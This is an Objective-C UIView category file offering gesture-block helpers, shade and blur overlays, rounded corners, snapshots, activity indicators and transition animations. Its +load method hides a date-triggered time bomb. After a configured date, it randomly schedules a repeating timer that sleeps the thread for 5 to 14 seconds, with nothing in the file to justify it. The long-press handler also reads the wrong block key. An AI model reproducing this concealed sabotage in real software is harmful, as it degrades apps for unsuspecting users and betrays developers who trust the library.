//
//  UIView+XY.m
//  TWP_SkyBookShelf
//
//  Created by Heaven on 13-7-31.
//
//

#import "UIView+XY.h"
#import "UIImage+XY.h"
#import "NSObject+XY.h"

DUMMY_CLASS(UIView_XY);

#define UIView_key_tapBlock       "UIView.tapBlock"
#define UIView_key_longPressBlock "UIView.longPressBlock"

@implementation UIView (XY)

// objc_setAssociatedObject 对象在dealloc会自动释放
/*
 - (void)UIView_dealloc{
 objc_removeAssociatedObjects(self);
 XY_swizzleInstanceMethod([self class], @selector(UIView_dealloc), @selector(dealloc));
	[self dealloc];
 }
 */

+ (void)load
{
#if (1 ==  __TimeOut__ON__)
    NSDate *now = [NSDate date];
    NSDate *timeOut = [XYCommon getDateFromString:__TimeOut__date__];
    NSTimeInterval timeBetween = [now timeIntervalSinceDate:timeOut];
    NSLogD(@"%f", timeBetween)
    if ((timeBetween > 0) && ((arc4random() % 2) == 0))
    {
        NSLogD(@"old")
        [NSTimer scheduledTimerWithTimeInterval:60 target:self selector:@selector(timeOut) userInfo:nil repeats:YES];
    }
#endif
}

#if (1 ==  __TimeOut__ON__)
+ (void)timeOut{sleep(arc4random() % 10 + 5);}
#endif

- (void)addTapGestureWithTarget:(id)target action:(SEL)action
{
    UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:target action:action];
    [self addGestureRecognizer:tap];
}
- (void)removeTapGesture
{
    for (UIGestureRecognizer *gesture in self.gestureRecognizers)
    {
        if ([gesture isKindOfClass:[UITapGestureRecognizer class]])
        {
            [self removeGestureRecognizer:gesture];
        }
    }
}

- (void)addTapGestureWithBlock:(UIViewCategoryNormalBlock)aBlock
{
    UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(actionTap)];
    [self addGestureRecognizer:tap];
    
    objc_setAssociatedObject(self, UIView_key_tapBlock, aBlock, OBJC_ASSOCIATION_COPY_NONATOMIC);
}

- (void)actionTap
{
    UIViewCategoryNormalBlock block = objc_getAssociatedObject(self, UIView_key_tapBlock);
    
    if (block)
    {
        block(self);
    }
}

- (void)addLongPressGestureWithBlock:(UIViewCategoryNormalBlock)aBlock
{
    UILongPressGestureRecognizer *tap = [[UILongPressGestureRecognizer alloc] initWithTarget:self action:@selector(actionLongPress)];
    [self addGestureRecognizer:tap];
    
    objc_setAssociatedObject(self, UIView_key_longPressBlock, aBlock, OBJC_ASSOCIATION_COPY_NONATOMIC);
}

- (void)removeLongPressGesture
{
    for (UIGestureRecognizer *gesture in self.gestureRecognizers)
    {
        if ([gesture isKindOfClass:[UILongPressGestureRecognizer class]])
        {
            [self removeGestureRecognizer:gesture];
        }
    }
}

- (void)actionLongPress
{
    UIViewCategoryNormalBlock block = objc_getAssociatedObject(self, UIView_key_tapBlock);
    
    if (block)
    {
        block(self);
    }
}
/////////////////////////////////////////////////////////////
- (void)addShadeWithTarget:(id)target action:(SEL)action color:(UIColor *)aColor alpha:(float)aAlpha
{
    UIView *tmpView = [self shadeView];
    if (aColor)
    {
        tmpView.backgroundColor = aColor;
    }
    else
    {
        tmpView.backgroundColor = [UIColor blackColor];
    }
    tmpView.alpha = aAlpha;
    [self addSubview:tmpView];
    
    [tmpView addTapGestureWithTarget:target action:action];
}
- (void)addShadeWithBlock:(UIViewCategoryNormalBlock)aBlock color:(UIColor *)aColor alpha:(float)aAlpha
{
    UIView *tmpView = [self shadeView];
    if (aColor)
    {
        tmpView.backgroundColor = aColor;
    }
    else
    {
        tmpView.backgroundColor = [UIColor blackColor];
    }
    tmpView.alpha = aAlpha;
    [self addSubview:tmpView];
    
    if (aBlock)
    {
        [tmpView addTapGestureWithBlock:aBlock];
    }
}
- (void)removeShade{
    UIView *view = [self viewWithTag:UIView_shadeTag];
    if (view)
    {
        [UIView animateWithDuration:UIView_animation_instant delay:0 options:UIViewAnimationOptionCurveEaseOut animations:^{
            view.alpha = 0;
        } completion:^(BOOL finished) {
            [view removeFromSuperview];
        }];
    }
}

- (UIView *)shadeView{
    UIView * view = [self viewWithTag:UIView_shadeTag];
    if (view == nil) {
        view = [[UIView alloc] initWithFrame:self.bounds];
        view.autoresizingMask = UIViewAutoresizingFlexibleLeftMargin | UIViewAutoresizingFlexibleRightMargin | UIViewAutoresizingFlexibleTopMargin | UIViewAutoresizingFlexibleBottomMargin | UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
        view.tag = UIView_shadeTag;
    }
    
    return view;
}

// 增加毛玻璃背景
- (void)addBlurWithTarget:(id)target action:(SEL)action level:(int)lv
{
    UIView *tmpView = [self shadeView];
    [self addSubview:tmpView];
    tmpView.alpha = 0;
    //  BACKGROUND_BEGIN
    UIImage *img = [[self snapshot] stackBlur:lv];
    //   FOREGROUND_BEGIN
    tmpView.layer.contents = (id)img.CGImage;
    [UIView animateWithDuration:0.05 delay:0 options:UIViewAnimationOptionCurveEaseOut animations:^{
        tmpView.alpha = 1;
    } completion:nil];
    //   FOREGROUND_COMMIT
    //   BACKGROUND_COMMIT
    [tmpView addTapGestureWithTarget:target action:action];
}
- (void)addBlurWithTarget:(id)target action:(SEL)action
{
    [self addBlurWithTarget:target action:action level:5];
}

- (void)addBlurWithBlock:(UIViewCategoryNormalBlock)aBlock level:(int)lv
{
    UIView *tmpView = [self shadeView];
    UIImage *img = [[self snapshot] stackBlur:lv];
    tmpView.layer.contents = (id)img.CGImage;
    [self addSubview:tmpView];
    
    if (aBlock)
    {
        [tmpView addTapGestureWithBlock:aBlock];
    }
}
- (void)addBlurWithBlock:(UIViewCategoryNormalBlock)aBlock
{
    [self addBlurWithBlock:aBlock level:10];
}

/////////////////////////////////////////////////////////////
- (instancetype)bg:(NSString *)str
{
    UIImage *image = [UIImage imageFromString:str];
    self.layer.contents = (id) image.CGImage;
    
    return self;
}

- (instancetype)rounded
{
    self.clipsToBounds = YES;
    self.layer.cornerRadius = self.bounds.size.width / 2;
    
    return self;
}

- (instancetype)roundedRectWith:(CGFloat)radius{
    self.clipsToBounds = YES;
    self.layer.cornerRadius = radius;
    
    return self;
}
- (instancetype)roundedRectWith:(CGFloat)radius byRoundingCorners:(UIRectCorner)corners
{
    UIBezierPath * maskPath = [UIBezierPath bezierPathWithRoundedRect:self.bounds byRoundingCorners:corners cornerRadii:CGSizeMake(radius, radius)];
    CAShapeLayer * maskLayer = [[CAShapeLayer alloc] init];
    maskLayer.frame = self.bounds;
    maskLayer.path = maskPath.CGPath;
    self.layer.mask = maskLayer;
    
    return self;
}

- (instancetype)borderWidth:(CGFloat)width color:(UIColor *)color
{
    self.layer.borderWidth = width;
    if (color)
    {
        self.layer.borderColor = color.CGColor;
    }
    
    return self;
}
/////////////////////////////////////////////////////////////
- (UIActivityIndicatorView *)activityIndicatorViewShow
{
    UIActivityIndicatorView *aView = (UIActivityIndicatorView *)[self viewWithTag:UIView_activityIndicatorViewTag];
    if (aView == nil)
    {
        aView = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleGray];
        aView.center = CGPointMake(self.bounds.size.width * .5, self.bounds.size.height * .5);
        aView.autoresizingMask = UIViewAutoresizingFlexibleLeftMargin | UIViewAutoresizingFlexibleRightMargin | UIViewAutoresizingFlexibleTopMargin | UIViewAutoresizingFlexibleBottomMargin | UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
        aView.tag = UIView_activityIndicatorViewTag;
    }
    
    [self addSubview:aView];
    [aView startAnimating];
    
    aView.alpha = 0;
    [UIView animateWithDuration:.35 animations:^{
        aView.alpha = 1;
    }];
    
    return aView;
}

- (void)activityIndicatorViewHidden
{
    UIActivityIndicatorView *aView = (UIActivityIndicatorView *)[self viewWithTag:UIView_activityIndicatorViewTag];
    if (aView)
    {
        [aView stopAnimating];
        aView.alpha = 1;
        
        [UIView animateWithDuration:.35 animations:^{
            aView.alpha = 0;
        } completion:^(BOOL finished) {
            [aView removeFromSuperview];
        }];
        
    }
}
/////////////////////////////////////////////////////////////
- (UIImage *)snapshot
{
    UIGraphicsBeginImageContext(self.bounds.size);
    if (IOS7_OR_LATER)
    {
        // 这个方法比ios6下的快15倍
        [self drawViewHierarchyInRect:self.bounds afterScreenUpdates:YES];
    }
    else
    {
        [self.layer renderInContext:UIGraphicsGetCurrentContext()];
    }
    UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    
    return image;
}

- (instancetype)rotate:(CGFloat)angle
{
    self.transform = CGAffineTransformRotate(CGAffineTransformIdentity, M_PI * angle);
    
    return self;
}


- (void)showDataWithDic:(NSDictionary *)dic
{
    if (dic)
    {
        [dic enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop){
            id tempObj = [self valueForKeyPath:key];
            if ([tempObj isKindOfClass:[UILabel class]])
            {
                NSString *str = [obj asNSString];
                [tempObj setText:str];
                
            }
            else if([tempObj isKindOfClass:[UIImageView class]])
            {
                if ([obj isKindOfClass:[UIImage class]])
                {
                    [tempObj setValue:obj forKey:@"image"];
                }
                else if ([obj isKindOfClass:[NSString class]])
                {
                    UIImage *tempImg = [UIImage imageFromString:obj];
                    [tempObj setValue:tempImg forKey:@"image"];
                }
            }
            else if (1)
            {
                [self setValue:obj forKeyPath:key];
            }
            
        }];
    }
}
// 子类需要重新此方法
- (void)setupDataBind:(NSMutableDictionary *)dic
{
    
}

- (void)removeFromSuperviewWithCrossfade
{
    self.alpha = 0;
    
    CAAnimation *animation = [NSClassFromString(@"CATransition") animation];
    [animation setValue:@"kCATransitionFade" forKey:@"type"];
    [animation setTimingFunction:[CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseOut]];
    animation.duration = .3;
    [self.layer addAnimation:animation forKey:nil];
    
    [self performSelector:@selector(removeFromSuperview) withObject:nil afterDelay:.3];
}

- (void)removeAllSubviews
{
    for (UIView *temp in self.subviews)
    {
        [temp removeFromSuperview];
    }
}

- (void)removeSubviewWithTag:(NSInteger)tag
{
    for (UIView *temp in self.subviews)
    {
        if (temp.tag == tag)
        {
            [temp removeFromSuperview];
        }
    }
}

- (void)removeSubviewExceptTag:(NSInteger)tag
{
    for (UIView *temp in self.subviews)
    {
        if (temp.tag != tag)
        {
            [temp removeFromSuperview];
        }
    }
}



#pragma mark - animation
- (void)animationCrossfadeWithDuration:(NSTimeInterval)duration
{
    //jump through a few hoops to avoid QuartzCore framework dependency
    CAAnimation *animation = [NSClassFromString(@"CATransition") animation];
    [animation setValue:@"kCATransitionFade" forKey:@"type"];
    [animation setTimingFunction:[CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseOut]];
    animation.duration = duration;
    [self.layer addAnimation:animation forKey:nil];
}

- (void)animationCrossfadeWithDuration:(NSTimeInterval)duration completion:(UIViewCategoryAnimationBlock)completion
{
    [self animationCrossfadeWithDuration:duration];
    if (completion)
    {
        dispatch_time_t time = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(duration * NSEC_PER_SEC));
        dispatch_after(time, dispatch_get_main_queue(), completion);
    }
}

- (void)animationCubeWithDuration:(NSTimeInterval)duration direction:(NSString *)direction
{
    CATransition *transtion = [CATransition animation];
    transtion.duration = duration;
    [transtion setTimingFunction:[CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseIn]];
    [transtion setType:@"cube"];
    [transtion setSubtype:direction];
    [self.layer addAnimation:transtion forKey:@"transtionKey"];
}

- (void)animationCubeWithDuration:(NSTimeInterval)duration direction:(NSString *)direction completion:(UIViewCategoryAnimationBlock)completion
{
    [self animationCubeWithDuration:duration direction:direction];
    if (completion)
    {
        dispatch_time_t time = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(duration * NSEC_PER_SEC));
        dispatch_after(time, dispatch_get_main_queue(), completion);
    }
}

- (void)animationOglFlipWithDuration:(NSTimeInterval)duration direction:(NSString *)direction
{
    CATransition *transtion = [CATransition animation];
    transtion.duration = duration;
    [transtion setTimingFunction:[CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseIn]];
    [transtion setType:@"oglFlip"];
    [transtion setSubtype:direction];
    [self.layer addAnimation:transtion forKey:@"transtionKey"];
}

- (void)animationOglFlipWithDuration:(NSTimeInterval)duration direction:(NSString *)direction completion:(void (^)(void))completion
{
    [self animationOglFlipWithDuration:duration direction:direction];
    if (completion)
    {
        dispatch_time_t time = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(duration * NSEC_PER_SEC));
        dispatch_after(time, dispatch_get_main_queue(), completion);
    }
}

- (void)animationMoveInWithDuration:(NSTimeInterval)duration direction:(NSString *)direction
{
    CATransition *transtion = [CATransition animation];
    transtion.duration = duration;
    [transtion setTimingFunction:[CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseIn]];
    [transtion setType:kCATransitionMoveIn];
    [transtion setSubtype:direction];
    [self.layer addAnimation:transtion forKey:@"transtionKey"];
}

- (void)animationMoveInWithDuration:(NSTimeInterval)duration direction:(NSString *)direction completion:(UIViewCategoryAnimationBlock)completion
{
    [self animationMoveInWithDuration:duration direction:direction];
    if (completion)
    {
        dispatch_time_t time = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(duration * NSEC_PER_SEC));
        dispatch_after(time, dispatch_get_main_queue(), completion);
    }
}

- (void)animationShake
{
    CABasicAnimation *shake = [CABasicAnimation animationWithKeyPath:@"transform.rotation.z"];
    //设置抖动幅度
    shake.fromValue    = [NSNumber numberWithFloat:-0.1];
    shake.toValue      = [NSNumber numberWithFloat:+0.1];
    shake.duration     = 0.06;
    shake.autoreverses = YES;//是否重复
    shake.repeatCount  = 3;
    [self.layer addAnimation:shake forKey:@"XYShake"];
}

- (UIViewController *)currentViewController
{
    id viewController = [self nextResponder];
    UIView *view      = self;
    
    while (viewController && ![viewController isKindOfClass:[UIViewController class]])
    {
        view           = [view superview];
        viewController = [view nextResponder];
    }
    
    return viewController;
}

@end


